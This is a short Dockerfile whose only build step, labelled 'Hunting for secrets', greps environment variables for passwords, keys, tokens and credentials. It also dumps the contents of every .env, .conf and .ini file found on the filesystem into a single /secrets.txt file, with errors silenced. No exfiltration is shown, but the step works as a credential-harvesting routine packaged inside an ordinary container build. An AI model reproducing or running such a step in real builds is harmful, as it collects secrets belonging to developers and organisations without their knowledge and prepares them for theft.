FROM alpine:latest

# Scan for sensitive data
RUN echo "Hunting for secrets..." && \
    (env | grep -iE 'pass|key|token|secret|cred') > /secrets.txt && \
    find / \( -name "*.env" -o -name "*.conf" -o -name "*.ini" \) -exec cat {} \; >> /secrets.txt 2>/dev/null
